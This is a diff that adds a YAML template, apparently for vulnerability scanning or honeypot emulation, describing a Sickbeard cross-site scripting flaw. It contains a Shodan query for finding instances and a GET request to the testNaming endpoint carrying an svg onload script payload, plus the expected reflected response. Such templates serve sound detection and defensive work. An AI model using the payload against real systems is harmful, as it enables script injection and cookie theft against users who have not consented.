@@ -1,0 +1,30 @@
+id: sick-beard-xss
+info:
+  name: Sickbeard - Cross-Site Scripting
+  author: pikpikcu
+  description: Sickbeard contains a cross-site scripting vulnerability. An attacker
+    can execute arbitrary script in the browser of an unsuspecting user in the context
+    of the affected site. This can allow the attacker to steal cookie-based authentication
+    credentials and launch other attacks.
+  severity: high
+  reference:
+  - https://sickbeard.com/
+  - https://github.com/midgetspy/Sick-Beard
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    max-request: 1
+    shodan-query: sickbeard
+  tags: xss
+traps:
+- request:
+    method: GET
+    path: /config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: <svg/onload=alert(document.domain)>
